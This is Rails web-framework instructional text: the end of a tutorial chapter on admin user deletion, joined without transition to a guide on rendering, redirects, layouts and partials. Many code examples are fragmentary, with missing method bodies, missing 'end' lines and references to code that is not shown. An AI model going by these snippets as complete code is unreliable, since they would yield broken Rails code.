Putting everything together gives the pagination and delete test in Listing~\ref{code:delete_link_integration_test}, which includes tests for both admins and non-admins.
An integration test for delete links and destroying users. 
Note that Listing~\ref{code:delete_link_integration_test} checks for the right delete links, including skipping the test if the user happens to be the admin (which lacks a delete link due to Listing~\ref{code:delete_links}).
At this point, our deletion code is well-tested, and the test suite should be \passing:
We've come a long way since introducing the Users controller way back in Section~\ref{sec:user_signup}.
Those users couldn't even sign up; now users can sign up, log in, log out, view their profiles, edit their settings, and see an index of all users---and some can even destroy other users.
As it presently stands, the sample application forms a solid foundation for any website requiring users with authentication and authorization.
In Chapter~\ref{cha:account_activation_and_password_reset}, we'll add two additional refinements: an account activation link for newly registered users (verifying a valid email address in the process) and password resets to help users who forget their passwords.
Before moving on, be sure to merge all the changes into the master branch:
You can also deploy the application and even populate the production database with sample users (using the \kode{pg:reset} task to reset the production database):
Of course, on a real site you probably wouldn't want to seed it with sample data, but I include it here for purposes of illustration (Figure~\ref{fig:heroku_sample_users}).
Incidentally, the order of the sample users in Figure~\ref{fig:heroku_sample_users} may vary, and on my system doesn't match the local version from Figure~\ref{fig:user_index_pagination}; this is because we haven't specified a default ordering for users when retrieved from the database, so the current order is database-dependent.
This doesn't matter much for users, but it will for microposts, and we'll address this issue further in Section~\ref{sec:ordering_and_dependency}.
The sample users in production.
\label{fig:heroku_sample_users}}<n>\end{figure}<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:updating_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Users can be updated using an edit form, which sends a \texttt{PATCH} request to the \kode{update} action.
Safe updating through the web is enforced using strong parameters.
Before filters give a standard way to run methods before particular controller actions.
We implement an authorization using before filters.
Authorization tests use both low-level commands to submit particular HTTP requests directly to controller actions and high-level integration tests.
Friendly forwarding redirects users where they wanted to go after logging in.
The users index page shows all users, one page at a time.
Rails uses the standard file \kode{db/seeds.rb} to seed the database with sample data using \kode{rake db:seed}.
A boolean attribute \kode{admin} on users automatically gives a \kode{user.admin?}\ boolean method.
Admins can delete users through the web by clicking on delete links that issue \texttt{DELETE} requests to the Users controller \kode{destroy} action.
We can create a large number of test users using embedded Ruby inside fixtures.
Write a test to make sure that friendly forwarding only forwards to the given URL the first time.
On subsequent login attempts, the forwarding URL should revert to the default (i.e., the profile page).
Write an integration test for all the layout links, including the proper behavior for logged-in and non-logged-in users.
\emph{Hint}: Add to the test in Listing~\ref{code:layout_links_test} using the \kode{log\_in\_as} helper.
By issuing a \texttt{PATCH} request directly to the \kode{update} method as shown in Listing~\ref{code:forbidden_admin_test}, verify that the \kode{admin} attribute isn't editable through the web.
in Listing~\ref{code:new_user_with_partial} and
Testing that the \kode{admin} attribute is forbidden.
The signup view with partial.
This guide covers the basic layout features of Action Controller and Action View.
* How to use the various rendering methods built into Rails.
* How to create layouts with multiple content sections.
* How to use partials to DRY up your views.
* How to use nested layouts (sub-templates).
Overview: How the Pieces Fit Together
This guide focuses on the interaction between Controller and View in the Model-View-Controller triangle. 
As you know, the Controller is responsible for orchestrating the whole process of handling a request in Rails, though it normally hands off any heavy code to the Model. 
But then, when it's time to send a response back to the user, the Controller hands things off to the View. 
It's that handoff that is the subject of this guide.
In broad strokes, this involves deciding what should be sent as the response and calling an appropriate method to create that response. 
If the response is a full-blown view, Rails also does some extra work to wrap the view in a layout and possibly to pull in partial views. 
You'll see all of those paths later in this guide.
Creating Responses
From the controller's point of view, there are three ways to create an HTTP response:
* Call `render` to create a full response to send back to the browser
* Call `redirect_to` to send an HTTP redirect status code to the browser
* Call `head` to create a response consisting solely of HTTP headers to send back to the browser
### Rendering by Default: Convention Over Configuration in Action
You've heard that Rails promotes "convention over configuration". 
Default rendering is an excellent example of this. 
By default, controllers in Rails automatically render views with names that correspond to valid routes. 
For example, if you have this code in your `BooksController` class:
class BooksController < ApplicationController
And the following in your routes file:
resources :books
And you have a view file `app/views/books/index.html.erb`:
<h1>Books are coming soon!
Rails will automatically render `app/views/books/index.html.erb` when you navigate to `/books` and you will see "Books are coming soon!" on your screen.
However a coming soon screen is only minimally useful, so you will soon create your `Book` model and add the index action to `BooksController`:
    @books = Book.all
Note that we don't have explicit render at the end of the index action in accordance with "convention over configuration" principle. 
The rule is that if you do not explicitly render something at the end of a controller action, Rails will automatically look for the `action_name.html.erb` template in the controller's view path and render it. 
So in this case, Rails will render the `app/views/books/index.html.erb` file.
If we want to display the properties of all the books in our view, we can do so with an ERB template like this:
<h1>Listing Books</h1>
    <th>Summary</th>
    <th></th>
<% @books.each do |book| %>
    <td><%= book.title %></td>
    <td><%= book.content %></td>
    <td><%= link_to "Show", book %></td>
    <td><%= link_to "Edit", edit_book_path(book) %></td>
    <td><%= link_to "Remove", book, method: :delete, data: { confirm: "Are you sure?" 
<%= link_to "New book", new_book_path %>
NOTE: The actual rendering is done by subclasses of `ActionView::TemplateHandlers`. 
This guide does not dig into that process, but it's important to know that the file extension on your view controls the choice of template handler. 
Beginning with Rails 2, the standard extensions are `.erb` for ERB (HTML with embedded Ruby), and `.builder` for Builder (XML generator).
### Using `render`
In most cases, the `ActionController::Base#render` method does the heavy lifting of rendering your application's content for use by a browser. 
There are a variety of ways to customize the behavior of `render`. 
You can render the default view for a Rails template, or a specific template, or a file, or inline code, or nothing at all. 
You can render text, JSON, or XML. 
You can specify the content type or HTTP status of the rendered response as well.
TIP: If you want to see the exact results of a call to `render` without needing to inspect it in a browser, you can call `render_to_string`. 
This method takes exactly the same options as `render`, but it returns a string instead of sending a response back to the browser.
#### Rendering Nothing
Perhaps the simplest thing you can do with `render` is to render nothing at all:
render nothing: true
If you look at the response for this using cURL, you will see the following:
$ curl -i 127.0.0.1:3000/books
HTTP/1.1 200 OK
Connection: close
Date: Sun, 24 Jan 2010 09:25:18 GMT
Content-Type: */*; charset=utf-8
X-Runtime: 0.014297
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache
We see there is an empty response (no data after the `Cache-Control` line), but the request was successful because Rails has set the response to 200 OK. You can set the `:status` option on render to change this response. 
Rendering nothing can be useful for Ajax requests where all you want to send back to the browser is an acknowledgment that the request was completed.
TIP: You should probably be using the `head` method, discussed later in this guide, instead of `render :nothing`. 
This provides additional flexibility and makes it explicit that you're only generating HTTP headers.
#### Rendering an Action's View
If you want to render the view that corresponds to a different template within the same controller, you can use `render` with the name of the view:
  @book = Book.find(params[:id])
  if @book.update(book_params)
    redirect_to(@book)
    render "edit"
If the call to `update` fails, calling the `update` action in this controller will render the `edit.html.erb` template belonging to the same controller.
If you prefer, you can use a symbol instead of a string to specify the action to render:
    render :edit
#### Rendering an Action's Template from Another Controller
What if you want to render a template from an entirely different controller from the one that contains the action code? 
You can also do that with `render`, which accepts the full path (relative to `app/views`) of the template to render. 
For example, if you're running code in an `AdminProductsController` that lives in `app/controllers/admin`, you can render the results of an action to a template in `app/views/products` this way:
render "products/show"
Rails knows that this view belongs to a different controller because of the embedded slash character in the string. 
If you want to be explicit, you can use the `:template` option (which was required on Rails 2.2 and earlier):
render template: "products/show"
#### Rendering an Arbitrary File
render file: "/u/apps/warehouse_app/current/app/views/products/show"
The `:file` option takes an absolute file-system path. 
Of course, you need to have rights<n>to the view that you're using to render the content.
TIP: If you're running Rails on Microsoft Windows, you should use the `:file` option to<n>render a file, because Windows filenames do not have the same format as Unix filenames.
#### Wrapping it up
The above three ways of rendering (rendering another template within the controller, rendering a template within another controller and rendering an arbitrary file on the file system) are actually variants of the same action.
In fact, in the BooksController class, inside of the update action where we want to render the edit template if the book does not update successfully, all of the following render calls would all render the `edit.html.erb` template in the `views/books` directory:
render :edit
render action: :edit
render "edit"
render "edit.html.erb"
render action: "edit"
render action: "edit.html.erb"
render "books/edit"
render "books/edit.html.erb"
render template: "books/edit"
render template: "books/edit.html.erb"
render "/path/to/rails/app/views/books/edit"
render "/path/to/rails/app/views/books/edit.html.erb"
render file: "/path/to/rails/app/views/books/edit"
render file: "/path/to/rails/app/views/books/edit.html.erb"
Which one you use is really a matter of style and convention, but the rule of thumb is to use the simplest one that makes sense for the code you are writing.
#### Using `render` with `:inline`
The `render` method can do without a view completely, if you're willing to use the `:inline` option to supply ERB as part of the method call. 
This is perfectly valid:
render inline: "<% products.each do |p| %><p><%= p.name %></p><% end %>"
WARNING: There is seldom any good reason to use this option. 
Mixing ERB into your controllers defeats the MVC orientation of Rails and will make it harder for other developers to follow the logic of your project. 
Use a separate erb view instead.
By default, inline rendering uses ERB. 
You can force it to use Builder instead with the `:type` option:
render inline: "xml.p {'Horrid coding practice!'}", type: :builder
#### Rendering Text
You can send plain text - with no markup at all - back to the browser by using<n>the `:plain` option to `render`:
render plain: "OK"
TIP: Rendering pure text is most useful when you're responding to Ajax or web<n>service requests that are expecting something other than proper HTML.
NOTE: By default, if you use the `:plain` option, the text is rendered without<n>using the current layout. 
#### Rendering HTML
You can send a HTML string back to the browser by using the `:html` option to<n>`render`:
render html: "<strong>Not Found</strong>".html_safe
TIP: This is useful when you're rendering a small snippet of HTML code.
However, you might want to consider moving it to a template file if the markup<n>is complex.
#### Rendering JSON
JSON is a JavaScript data format used by many Ajax libraries. 
Rails has built-in support for converting objects to JSON and rendering that JSON back to the browser:
render json: @product
TIP: You don't need to call `to_json` on the object that you want to render. 
If you use the `:json` option, `render` will automatically call `to_json` for you.
#### Rendering XML
Rails also has built-in support for converting objects to XML and rendering that XML back to the caller:
render xml: @product
TIP: You don't need to call `to_xml` on the object that you want to render. 
If you use the `:xml` option, `render` will automatically call `to_xml` for you.
#### Rendering Vanilla JavaScript
Rails can render vanilla JavaScript:
render js: "alert('Hello Rails');"
This will send the supplied string to the browser with a MIME type of `text/javascript`.
#### Rendering raw body
You can send a raw content back to the browser, without setting any content<n>type, by using the `:body` option to `render`:
render body: "raw"
TIP: This option should be used only if you don't care about the content type of<n>the response. 
Using `:plain` or `:html` might be more appropriate in most of the<n>time.
#### Options for `render`
Calls to the `render` method generally accept four options:
* `:content_type`
* `:layout`
* `:location`
* `:status`
##### The `:content_type` Option
By default, Rails will serve the results of a rendering operation with the MIME content-type of `text/html` (or `application/json` if you use the `:json` option, or `application/xml` for the `:xml` option.). 
There are times when you might like to change this, and you can do so by setting the `:content_type` option:
render file: filename, content_type: "application/rss"
##### The `:layout` Option
With most of the options to `render`, the rendered content is displayed as part of the current layout. 
You'll learn more about layouts and how to use them later in this guide.
You can use the `:layout` option to tell Rails to use a specific file as the layout for the current action:
render layout: "special_layout"
You can also tell Rails to render with no layout at all:
render layout: false
##### The `:location` Option
You can use the `:location` option to set the HTTP `Location` header:
render xml: photo, location: photo_url(photo)
##### The `:status` Option
Rails will automatically generate a response with the correct HTTP status code (in most cases, this is `200 OK`). 
You can use the `:status` option to change this:
render status: 500
render status: :forbidden
Rails understands both numeric status codes and the corresponding symbols shown below.
| Response Class      | HTTP Status Code | Symbol                           |
| ------------------- | ---------------- | -------------------------------- |
| **Informational**   | 100              | :continue                        |
|                     | 101              | :switching_protocols             |
|                     | 102              | :processing                      |
| **Success**         | 200              | :ok                              |
|                     | 201              | :created                         |
|                     | 202              | :accepted                        |
|                     | 203              | :non_authoritative_information   |
|                     | 204              | :no_content                      |
|                     | 205              | :reset_content                   |
|                     | 206              | :partial_content                 |
|                     | 207              | :multi_status                    |
|                     | 208              | :already_reported                |
|                     | 226              | :im_used                         |
| **Redirection**     | 300              | :multiple_choices                |
|                     | 301              | :moved_permanently               |
|                     | 302              | :found                           |
|                     | 303              | :see_other                       |
|                     | 304              | :not_modified                    |
|                     | 305              | :use_proxy                       |
|                     | 306              | :reserved                        |
|                     | 307              | :temporary_redirect              |
|                     | 308              | :permanent_redirect              |
| **Client Error**    | 400              | :bad_request                     |
|                     | 401              | :unauthorized                    |
|                     | 402              | :payment_required                |
|                     | 403              | :forbidden                       |
|                     | 404              | :not_found                       |
|                     | 405              | :method_not_allowed              |
|                     | 406              | :not_acceptable                  |
|                     | 407              | :proxy_authentication_required   |
|                     | 408              | :request_timeout                 |
|                     | 409              | :conflict                        |
|                     | 410              | :gone                            |
|                     | 411              | :length_required                 |
|                     | 412              | :precondition_failed             |
|                     | 413              | :request_entity_too_large        |
|                     | 414              | :request_uri_too_long            |
|                     | 415              | :unsupported_media_type          |
|                     | 416              | :requested_range_not_satisfiable |
|                     | 417              | :expectation_failed              |
|                     | 422              | :unprocessable_entity            |
|                     | 423              | :locked                          |
|                     | 424              | :failed_dependency               |
|                     | 426              | :upgrade_required                |
|                     | 428              | :precondition_required           |
|                     | 429              | :too_many_requests               |
|                     | 431              | :request_header_fields_too_large |
| **Server Error**    | 500              | :internal_server_error           |
|                     | 501              | :not_implemented                 |
|                     | 502              | :bad_gateway                     |
|                     | 503              | :service_unavailable             |
|                     | 504              | :gateway_timeout                 |
|                     | 505              | :http_version_not_supported      |
|                     | 506              | :variant_also_negotiates         |
|                     | 507              | :insufficient_storage            |
|                     | 508              | :loop_detected                   |
|                     | 510              | :not_extended                    |
|                     | 511              | :network_authentication_required |
#### Finding Layouts
To find the current layout, Rails first looks for a file in `app/views/layouts` with the same base name as the controller. 
For example, rendering actions from the `PhotosController` class will use `app/views/layouts/photos.html.erb` (or `app/views/layouts/photos.builder`). 
If there is no such controller-specific layout, Rails will use `app/views/layouts/application.html.erb` or `app/views/layouts/application.builder`. 
If there is no `.erb` layout, Rails will use a `.builder` layout if one exists. 
Rails also provides several ways to more precisely assign specific layouts to individual controllers and actions.
##### Specifying Layouts for Controllers
You can override the default layout conventions in your controllers by using the `layout` declaration. 
class ProductsController < ApplicationController
  layout "inventory"
  #...
With this declaration, all of the views rendered by the `ProductsController` will use `app/views/layouts/inventory.html.erb` as their layout.
To assign a specific layout for the entire application, use a `layout` declaration in your `ApplicationController` class:
class ApplicationController < ActionController::Base
  layout "main"
With this declaration, all of the views in the entire application will use `app/views/layouts/main.html.erb` for their layout.
##### Choosing Layouts at Runtime
You can use a symbol to defer the choice of layout until a request is processed:
  layout :products_layout
    @product = Product.find(params[:id])
    def products_layout
      @current_user.special? ? 
"special" : "products"
Now, if the current user is a special user, they'll get a special layout when viewing a product.
You can even use an inline method, such as a Proc, to determine the layout. 
For example, if you pass a Proc object, the block you give the Proc will be given the `controller` instance, so the layout can be determined based on the current request:
##### Conditional Layouts
Layouts specified at the controller level support the `:only` and `:except` options. 
These options take either a method name, or an array of method names, corresponding to method names within the controller:
With this declaration, the `product` layout would be used for everything but the `rss` and `index` methods.
##### Layout Inheritance
Layout declarations cascade downward in the hierarchy, and more specific layout declarations always override more general ones. 
* `application_controller.rb`
      layout "main"
      layout "special"
      layout false
      def show
        render layout: "old"
      # ...
In this application:
* In general, views will be rendered in the `main` layout
#### Avoiding Double Render Errors
Sooner or later, most Rails developers will see the error message "Can only render or redirect once per action". 
While this is annoying, it's relatively easy to fix. 
Usually it happens because of a fundamental misunderstanding of the way that `render` works.
For example, here's some code that will trigger this error:
  if @book.special?
    render action: "special_show"
  render action: "regular_show"
If `@book.special?` evaluates to `true`, Rails will start the rendering process to dump the `@book` variable into the `special_show` view. 
But this will _not_ stop the rest of the code in the `show` action from running, and when Rails hits the end of the action, it will start to render the `regular_show` view - and throw an error. 
The solution is simple: make sure that you have only one call to `render` or `redirect` in a single code path. 
One thing that can help is `and return`. 
Here's a patched version of the method:
    render action: "special_show" and return
Make sure to use `and return` instead of `&& return` because `&& return` will not work due to the operator precedence in the Ruby Language.
Note that the implicit render done by ActionController detects if `render` has been called, so the following will work without errors:
This will render a book with `special?` set with the `special_show` template, while other books will render with the default `show` template.
### Using `redirect_to`
Another way to handle returning responses to an HTTP request is with `redirect_to`. 
As you've seen, `render` tells Rails which view (or other asset) to use in constructing a response. 
The `redirect_to` method does something completely different: it tells the browser to send a new request for a different URL. 
For example, you could redirect from wherever you are in your code to the index of photos in your application with this call:
redirect_to photos_url
You can use `redirect_to` with any arguments that you could use with `link_to` or `url_for`. 
There's also a special redirect that sends the user back to the page they just came from:
redirect_to :back
#### Getting a Different Redirect Status Code
Rails uses HTTP status code 302, a temporary redirect, when you call `redirect_to`. 
If you'd like to use a different status code, perhaps 301, a permanent redirect, you can use the `:status` option:
redirect_to photos_path, status: 301
Just like the `:status` option for `render`, `:status` for `redirect_to` accepts both numeric and symbolic header designations.
#### The Difference Between `render` and `redirect_to`
Sometimes inexperienced developers think of `redirect_to` as a sort of `goto` command, moving execution from one place to another in your Rails code. 
This is _not_ correct. 
Your code stops running and waits for a new request for the browser. 
It just happens that you've told the browser what request it should make next, by sending back an HTTP 302 status code.
Consider these actions to see the difference:
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    render action: "index"
With the code in this form, there will likely be a problem if the `@book` variable is `nil`. 
Remember, a `render :action` doesn't run any code in the target action, so nothing will set up the `@books` variable that the `index` view will probably require. 
One way to fix this is to redirect instead of rendering:
    redirect_to action: :index
With this code, the browser will make a fresh request for the index page, the code in the `index` method will run, and all will be well.
The only downside to this code is that it requires a round trip to the browser: the browser requested the show action with `/books/1` and the controller finds that there are no books, so the controller sends out a 302 redirect response to the browser telling it to go to `/books/`, the browser complies and sends a new request back to the controller asking now for the `index` action, the controller then gets all the books in the database and renders the index template, sending it back down to the browser which then shows it on your screen.
While in a small application, this added latency might not be a problem, it is something to think about if response time is a concern. 
We can demonstrate one way to handle this with a contrived example:
    flash.now[:alert] = "Your book was not found"
    render "index"
This would detect that there are no books with the specified ID, populate the `@books` instance variable with all the books in the model, and then directly render the `index.html.erb` template, returning it to the browser with a flash alert message to tell the user what happened.
### Using `head` To Build Header-Only Responses
The `head` method can be used to send responses with only headers to the browser. 
It provides a more obvious alternative to calling `render :nothing`. 
The `head` method accepts a number or symbol (see [reference table](#the-status-option)) representing a HTTP status code. 
The options argument is interpreted as a hash of header names and values. 
For example, you can return only an error header:
head :bad_request
This would produce the following header:
HTTP/1.1 400 Bad Request
Date: Sun, 24 Jan 2010 12:15:53 GMT
Content-Type: text/html; charset=utf-8
X-Runtime: 0.013483
Or you can use other HTTP headers to convey other information:
head :created, location: photo_path(@photo)
Which would produce:
HTTP/1.1 201 Created
Date: Sun, 24 Jan 2010 12:16:44 GMT
Location: /photos/1
X-Runtime: 0.083496
Structuring Layouts
When Rails renders a view as a response, it does so by combining the view with the current layout, using the rules for finding the current layout that were covered earlier in this guide. 
Within a layout, you have access to three tools for combining different bits of output to form the overall response:
### Asset Tag Helpers
Asset tag helpers provide methods for generating HTML that link views to feeds, JavaScript, stylesheets, images, videos and audios. 
There are six asset tag helpers available in Rails:
You can use these tags in layouts or other views, although the `auto_discovery_link_tag`, `javascript_include_tag`, and `stylesheet_link_tag`, are most commonly used in the `<head>` section of a layout.
WARNING: The asset tag helpers do _not_ verify the existence of the assets at the specified locations; they simply assume that you know what you're doing and generate the link.
#### Linking to Feeds with the `auto_discovery_link_tag`
The `auto_discovery_link_tag` helper builds HTML that most browsers and feed readers can use to detect the presence of RSS or Atom feeds. 
It takes the type of the link (`:rss` or `:atom`), a hash of options that are passed through to url_for, and a hash of options for the tag:
<%= auto_discovery_link_tag(:rss, {action: "feed"},
  {title: "RSS Feed"}) %>
There are three tag options available for the `auto_discovery_link_tag`:
* `:rel` specifies the `rel` value in the link. 
The default value is "alternate".
* `:type` specifies an explicit MIME type. 
Rails will generate an appropriate MIME type automatically.
* `:title` specifies the title of the link. 
The default value is the uppercase `:type` value, for example, "ATOM" or "RSS".
#### Linking to JavaScript Files with the `javascript_include_tag`
The `javascript_include_tag` helper returns an HTML `script` tag for each source provided.
If you are using Rails with the [Asset Pipeline](asset_pipeline.html) enabled, this helper will generate a link to `/assets/javascripts/` rather than `public/javascripts` which was used in earlier versions of Rails. 
This link is then served by the asset pipeline.
A JavaScript file within a Rails application or Rails engine goes in one of three locations: `app/assets`, `lib/assets` or `vendor/assets`. 
These locations are explained in detail in the [Asset Organization section in the Asset Pipeline Guide](asset_pipeline.html#asset-organization)
You can specify a full path relative to the document root, or a URL, if you prefer. 
For example, to link to a JavaScript file that is inside a directory called `javascripts` inside of one of `app/assets`, `lib/assets` or `vendor/assets`, you would do this:
<%= javascript_include_tag "main" %>
Rails will then output a `script` tag such as this:
<script src='/assets/main.js'></script>
The request to this asset is then served by the Sprockets gem.
To include multiple files such as `app/assets/javascripts/main.js` and `app/assets/javascripts/columns.js` at the same time:
<%= javascript_include_tag "main", "columns" %>
To include `app/assets/javascripts/main.js` and `app/assets/javascripts/photos/columns.js`:
<%= javascript_include_tag "main", "/photos/columns" %>
To include `http://example.com/main.js`:
<%= javascript_include_tag "http://example.com/main.js" %>
#### Linking to CSS Files with the `stylesheet_link_tag`
The `stylesheet_link_tag` helper returns an HTML `<link>` tag for each source provided.
If you are using Rails with the "Asset Pipeline" enabled, this helper will generate a link to `/assets/stylesheets/`. 
This link is then processed by the Sprockets gem. 
A stylesheet file can be stored in one of three locations: `app/assets`, `lib/assets` or `vendor/assets`.
You can specify a full path relative to the document root, or a URL. 
For example, to link to a stylesheet file that is inside a directory called `stylesheets` inside of one of `app/assets`, `lib/assets` or `vendor/assets`, you would do this:
<%= stylesheet_link_tag "main" %>
To include `app/assets/stylesheets/main.css` and `app/assets/stylesheets/columns.css`:
<%= stylesheet_link_tag "main", "columns" %>
To include `app/assets/stylesheets/main.css` and `app/assets/stylesheets/photos/columns.css`:
<%= stylesheet_link_tag "main", "photos/columns" %>
To include `http://example.com/main.css`:
<%= stylesheet_link_tag "http://example.com/main.css" %>
By default, the `stylesheet_link_tag` creates links with `media="screen" rel="stylesheet"`. 
You can override any of these defaults by specifying an appropriate option (`:media`, `:rel`):
<%= stylesheet_link_tag "main_print", media: "print" %>
#### Linking to Images with the `image_tag`
The `image_tag` helper builds an HTML `<img />` tag to the specified file. 
By default, files are loaded from `public/images`.
WARNING: Note that you must specify the extension of the image.
<%= image_tag "header.png" %>
You can supply a path to the image if you like:
<%= image_tag "icons/delete.gif" %>
You can supply a hash of additional HTML options:
<%= image_tag "icons/delete.gif", {height: 45} %>
You can supply alternate text for the image which will be used if the user has images turned off in their browser. 
If you do not specify an alt text explicitly, it defaults to the file name of the file, capitalized and with no extension. 
For example, these two image tags would return the same code:
<%= image_tag "home.gif" %>
<%= image_tag "home.gif", alt: "Home" %>
You can also specify a special size tag, in the format "{width}x{height}":
<%= image_tag "home.gif", size: "50x20" %>
In addition to the above special tags, you can supply a final hash of standard HTML options, such as `:class`, `:id` or `:name`:
<%= image_tag "home.gif", alt: "Go Home",
                          id: "HomeImage",
                          class: "nav_bar" %>
#### Linking to Videos with the `video_tag`
The `video_tag` helper builds an HTML 5 `<video>` tag to the specified file. 
By default, files are loaded from `public/videos`.
<%= video_tag "movie.ogg" %>
Produces
<video src="/videos/movie.ogg" />
Like an `image_tag` you can supply a path, either absolute, or relative to the `public/videos` directory. 
Additionally you can specify the `size: "#{width}x#{height}"` option just like an `image_tag`. 
Video tags can also have any of the HTML options specified at the end (`id`, `class` et al).
The video tag also supports all of the `<video>` HTML options through the HTML options hash, including:
* `poster: "image_name.png"`, provides an image to put in place of the video before it starts playing.
* `autoplay: true`, starts playing the video on page load.
* `loop: true`, loops the video once it gets to the end.
* `controls: true`, provides browser supplied controls for the user to interact with the video.
* `autobuffer: true`, the video will pre load the file for the user on page load.
You can also specify multiple videos to play by passing an array of videos to the `video_tag`:
<%= video_tag ["trailer.ogg", "movie.ogg"] %>
This will produce:
#### Linking to Audio Files with the `audio_tag`
The `audio_tag` helper builds an HTML 5 `<audio>` tag to the specified file. 
By default, files are loaded from `public/audios`.
<%= audio_tag "music.mp3" %>
You can supply a path to the audio file if you like:
<%= audio_tag "music/first_song.mp3" %>
You can also supply a hash of additional options, such as `:id`, `:class` etc.
Like the `video_tag`, the `audio_tag` has special options:
* `autoplay: true`, starts playing the audio on page load
* `controls: true`, provides browser supplied controls for the user to interact with the audio.
* `autobuffer: true`, the audio will pre load the file for the user on page load.
### Understanding `yield`
Within the context of a layout, `yield` identifies a section where content from the view should be inserted. 
The simplest way to use this is to have a single `yield`, into which the entire contents of the view currently being rendered is inserted:
You can also create a layout with multiple yielding regions:
  <%= yield :head %>
The main body of the view will always render into the unnamed `yield`. 
To render content into a named `yield`, you use the `content_for` method.
### Using the `content_for` Method
The `content_for` method allows you to insert content into a named `yield` block in your layout. 
For example, this view would work with the layout that you just saw:
<% content_for :head do %>
  <title>A simple page</title>
<p>Hello, Rails!
The result of rendering this page into the supplied layout would be this HTML:
  <p>Hello, Rails!
The `content_for` method is very helpful when your layout contains distinct regions such as sidebars and footers that should get their own blocks of content inserted. 
It's also useful for inserting tags that load page-specific JavaScript or css files into the header of an otherwise generic layout.
### Using Partials
Partial templates - usually just called "partials" - are another device for breaking the rendering process into more manageable chunks. 
With a partial, you can move the code for rendering a particular piece of a response to its own file.
#### Naming Partials
To render a partial as part of a view, you use the `render` method within the view:
This will render a file named `_menu.html.erb` at that point within the view being rendered. 
That code will pull in the partial from `app/views/shared/_menu.html.erb`.
#### Using Partials to Simplify Views
One way to use partials is to treat them as the equivalent of subroutines: as a way to move details out of a view so that you can grasp what's going on more easily. 
For example, you might have a view that looked like this:
TIP: For content that is shared among all pages in your application, you can use partials directly from layouts.
#### Partial Layouts
A partial can use its own layout file, just as a view can use a layout. 
For example, you might call a partial like this:
<%= render partial: "link_area", layout: "graybar" %>
This would look for a partial named `_link_area.html.erb` and render it using the layout `_graybar.html.erb`. 
Note that layouts for partials follow the same leading-underscore naming as regular partials, and are placed in the same folder with the partial that they belong to (not in the master `layouts` folder).
Also note that explicitly specifying `:partial` is required when passing additional options such as `:layout`.
#### Passing Local Variables
You can also pass local variables into partials, making them even more powerful and flexible. 
For example, you can use this technique to reduce duplication between new and edit pages, while still keeping a bit of distinct content:
* `new.html.erb`
    <h1>New zone</h1>
    <%= render partial: "form", locals: {zone: @zone} %>
* `edit.html.erb`
    <h1>Editing zone</h1>
* `_form.html.erb`
    <%= form_for(zone) do |f| %>
      <p>
        <b>Zone name</b><br>
        <%= f.text_field :name %>
      </p>
      <p>
        <%= f.submit %>
Although the same partial will be rendered into both views, Action View's submit helper will return "Create Zone" for the new action and "Update Zone" for the edit action.
Every partial also has a local variable with the same name as the partial (minus the underscore). 
You can pass an object in to this local variable via the `:object` option:
<%= render partial: "customer", object: @new_customer %>
Within the `customer` partial, the `customer` variable will refer to `@new_customer` from the parent view.
If you have an instance of a model to render into a partial, you can use a shorthand syntax:
<%= render @customer %>
Assuming that the `@customer` instance variable contains an instance of the `Customer` model, this will use `_customer.html.erb` to render it and will pass the local variable `customer` into the partial which will refer to the `@customer` instance variable in the parent view.
#### Rendering Collections
Partials are very useful in rendering collections. 
When you pass a collection to a partial via the `:collection` option, the partial will be inserted once for each member in the collection:
* `index.html.erb`
    <h1>Products</h1>
    <%= render partial: "product", collection: @products %>
* `_product.html.erb`
    <p>Product Name: <%= product.name %></p>
When a partial is called with a pluralized collection, then the individual instances of the partial have access to the member of the collection being rendered via a variable named after the partial. 
In this case, the partial is `_product`, and within the `_product` partial, you can refer to `product` to get the instance that is being rendered.
There is also a shorthand for this. 
Assuming `@products` is a collection of `product` instances, you can simply write this in the `index.html.erb` to produce the same result:
Rails determines the name of the partial to use by looking at the model name in the collection. 
In fact, you can even create a heterogeneous collection and render it this way, and Rails will choose the proper partial for each member of the collection:
    <h1>Contacts</h1>
    <%= render [customer1, employee1, customer2, employee2] %>
* `customers/_customer.html.erb`
    <p>Customer: <%= customer.name %></p>
* `employees/_employee.html.erb`
    <p>Employee: <%= employee.name %></p>
In this case, Rails will use the customer or employee partials as appropriate for each member of the collection.
In the event that the collection is empty, `render` will return nil, so it should be fairly simple to provide alternative content.
<%= render(@products) || "There are no products available." 
#### Local Variables
To use a custom local variable name within the partial, specify the `:as` option in the call to the partial:
<%= render partial: "product", collection: @products, as: :item %>
With this change, you can access an instance of the `@products` collection as the `item` local variable within the partial.
You can also pass in arbitrary local variables to any partial you are rendering with the `locals: {}` option:
<%= render partial: "product", collection: @products,
           as: :item, locals: {title: "Products Page"} %>
In this case, the partial will have access to a local variable `title` with the value "Products Page".
TIP: Rails also makes a counter variable available within a partial called by the collection, named after the member of the collection followed by `_counter`. 
For example, if you're rendering `@products`, within the partial you can refer to `product_counter` to tell you how many times the partial has been rendered. 
This does not work in conjunction with the `as: :value` option.
You can also specify a second partial to be rendered between instances of the main partial by using the `:spacer_template` option:
Rails will render the `_product_ruler` partial (with no data passed in to it) between each pair of `_product` partials.
#### Collection Partial Layouts
When rendering collections it is also possible to use the `:layout` option:
<%= render partial: "product", collection: @products, layout: "special_layout" %>
The layout will be rendered together with the partial for each item in the collection. 
The current object and object_counter variables will be available in the layout as well, the same way they do within the partial.
### Using Nested Layouts
You may find that your application requires a layout that differs slightly from your regular application layout to support one particular controller. 
Rather than repeating the main layout and editing it, you can accomplish this by using nested layouts (sometimes called sub-templates). 
Here's an example:
Suppose you have the following `ApplicationController` layout:
* `app/views/layouts/application.html.erb`
    <html>
    <head>
      <title><%= @page_title or "Page Title" %></title>
      <%= stylesheet_link_tag "layout" %>
      <style><%= yield :stylesheets %></style>
    </head>
    <body>
      <div id="top_menu">Top menu items here</div>
      <div id="menu">Menu items here</div>
      <div id="content"><%= content_for?(:content) ? 
yield(:content) : yield %></div>
    </body>
    </html>
On pages generated by `NewsController`, you want to hide the top menu and add a right menu:
* `app/views/layouts/news.html.erb`
    <% content_for :stylesheets do %>
      #top_menu {display: none}
      #right_menu {float: right; background-color: yellow; color: black}
      <div id="right_menu">Right menu items here</div>
      <%= content_for?(:news_content) ? 
yield(:news_content) : yield %>
    <%= render template: "layouts/application" %>
That's it. 
The News views will use the new layout, hiding the top menu and adding a new right menu inside the "content" div.
There are several ways of getting similar results with different sub-templating schemes using this technique. 
Note that there is no limit in nesting levels. 
